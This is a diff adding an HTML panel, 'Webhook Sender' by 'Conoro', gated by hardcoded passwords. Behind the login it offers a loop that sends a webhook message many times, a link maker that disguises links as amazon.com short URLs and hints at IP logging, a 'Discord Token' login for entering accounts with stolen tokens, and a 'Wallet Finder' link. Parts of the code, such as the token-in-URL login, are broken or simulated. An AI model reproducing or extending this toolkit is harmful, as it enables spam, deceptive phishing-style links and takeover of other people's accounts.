@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook Sender</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: url('861abd21ba51da52546620ee40c78a15.jpg') no-repeat center center fixed; /* Replace 'background.jpg' with your actual image */
+            background-size: cover;
+        }
+        .zoom-container {
+            overflow: auto; /* Enable scrolling when zoomed */
+            transform-origin: center center; /* Center zooming */
+            transition: transform 0.2s ease; /* Smooth transition */
+            width: 100%; /* Ensure full width */
+            height: 100%; /* Ensure full height */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container, .link-maker, .token-login, .wallet-finder {
+            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background for better contrast */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+            position: relative; /* To position the text absolutely */
+            margin-right: 20px; /* Spacing between the boxes */
+        }
+        h2 {
+            margin-top: 0;
+            font-size: 24px;
+            text-align: center;
+            color: #fff;
+        }
+        label {
+            font-weight: bold;
+            color: #fff;
+        }
+        input[type="text"], input[type="password"], input[type="number"], textarea {
+            width: calc(100% - 20px);
+            margin: 8px 0;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        textarea {
+            height: 100px;
+        }
+        input[type="submit"], button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        input[type="submit"]:hover, button:hover {
+            background-color: #45a049;
+        }
+        .generated-link {
+            margin-top: 10px;
+            padding: 8px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            word-break: break-all;
+            font-size: 14px;
+            color: #fff;
+        }
+        .made-by {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+            position: relative;
+        }
+    </style>
+</head>
+<body>
+    <div class="zoom-container" id="zoomContainer">
+        <div class="login-container" id="loginContainer">
+            <h2>Login</h2>
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+                <br><br>
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+                <br><br>
+                <input type="submit" value="Login">
+            </form>
+        </div>
+
+        <div class="container" id="mainContainer" style="display: none;">
+            <h2>Send Webhook Message</h2>
+            <form id="webhookForm" onsubmit="sendMessage(event)">
+                <label for="webhookUrl">Webhook URL:</label>
+                <input type="text" id="webhookUrl" name="webhookUrl" required>
+                <br><br>
+                <label for="message">Message:</label>
+                <br>
+                <textarea id="message" name="message" required></textarea>
+                <br><br>
+                <label for="times">Times to Send:</label>
+                <br>
+                <input type="number" id="times" name="times" min="1" value="1" required>
+                <br><br>
+                <input type="submit" value="Send Message">
+            </form>
+        </div>
+
+        <div class="link-maker" id="linkMakerContainer" style="display: none;">
+            <h2>Link Maker</h2>
+            <form id="linkMakerForm" onsubmit="makeLink(event)">
+                <label for="webhookUrl2">Webhook URL:</label>
+                <input type="text" id="webhookUrl2" name="webhookUrl2" required>
+                <br><br>
+                <input type="submit" value="Generate Link">
+            </form>
+            <div id="generatedLink" class="generated-link"></div>
+        </div>
+
+        <div class="token-login" id="tokenLoginContainer" style="display: none;">
+            <h2>Token Login</h2>
+            <form id="tokenLoginForm" onsubmit="loginWithToken(event)">
+                <label for="discordToken">Discord Token:</label>
+                <input type="text" id="discordToken" name="discordToken" required>
+                <br><br>
+                <input type="submit" value="Login with Token">
+            </form>
+        </div>
+
+        <div class="wallet-finder" id="walletFinderContainer" style="display: none;">
+            <h2>Wallet Finder</h2>
+            <button onclick="openWalletFinder()">Open Wallet Finder</button>
+        </div>
+    </div>
+    <div class="made-by">Made By Conoro</div>
+
+    <script>
+        function handleLogin(event) {
+            event.preventDefault();
+            var form = document.getElementById("loginForm");
+            var username = form.elements["username"].value;
+            var password = form.elements["password"].value;
+
+            if ((username === "Conoro" && password === "Conoro1234") || (username === "Szn" && password === "Szn1234")) {
+                document.getElementById("loginContainer").style.display = "none";
+                document.getElementById("mainContainer").style.display = "block";
+                document.getElementById("linkMakerContainer").style.display = "block";
+                document.getElementById("tokenLoginContainer").style.display = "block";
+                document.getElementById("walletFinderContainer").style.display = "block";
+            } else {
+                alert("Invalid credentials, please try again.");
+            }
+        }
+
+        function sendMessage(event) {
+            event.preventDefault();
+            var form = document.getElementById("webhookForm");
+            var webhookUrl = form.elements["webhookUrl"].value;
+            var message = form.elements["message"].value;
+            var times = parseInt(form.elements["times"].value);
+
+            for (var i = 0; i < times; i++) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: message })
+                }).then(response => console.log('Message sent successfully'))
+                .catch(error => console.error('Error sending message:', error));
+            }
+        }
+
+        function makeLink(event) {
+            event.preventDefault();
+            var form = document.getElementById("linkMakerForm");
+            var webhookUrl = form.elements["webhookUrl2"].value;
+
+            // Generate a unique short link
+            var shortLink = generateShortLink(webhookUrl);
+
+            // Display the generated link
+            document.getElementById("generatedLink").innerHTML = `<a href="${shortLink}" target="_blank">${shortLink}</a>`;
+
+            // Redirect to the link
+            window.location.href = `redirect.php?url=${encodeURIComponent(shortLink)}`; // Redirect with link
+
+            // No need to send IP to webhook here
+        }
+
+        function loginWithToken(event) {
+            event.preventDefault();
+            var form = document.getElementById("tokenLoginForm");
+            var discordToken = form.elements["discordToken"].value;
+            var url = `https://discord.com/login?token=${discordToken}`;
+
+            // Open in an incognito window (private browsing mode)
+            var win = window.open(url, '_blank', 'width=800,height=600,status=yes,chrome=yes,incognito=yes');
+
+            // Check if popup window was blocked
+            if (!win) {
+                alert('Please allow popups for this site');
+            }
+        }
+
+        function generateShortLink(url) {
+            // Simulate generating a unique short link
+            var randomId = Math.random().toString(36).substr(2, 7); // Generate a random ID
+            var shortLink = `https://amazon.com/${randomId}`; // Replace with your domain and path
+            return shortLink;
+        }
+
+        // Function to open the wallet finder page
+        function openWalletFinder() {
+            window.location.href = 'wallet.html';
+        }
+
+        // Zooming functionality
+        var scale = 1;
+        var zoomContainer = document.getElementById('zoomContainer');
+
+        function handleZoom(event) {
+            event.preventDefault();
+            var delta = event.deltaY || event.detail || event.wheelDelta;
+
+            // Adjust scale
+            scale += delta / 1000;
+            scale = Math.min(Math.max(.125, scale), 4); // Restrict scale to a reasonable range
+
+            // Apply scale
+            zoomContainer.style.transform = 'scale(' + scale + ')';
+        }
+
+        // Listen for mouse wheel scroll events
+        zoomContainer.addEventListener('wheel', handleZoom);
+    </script>
+</body>
+</html>
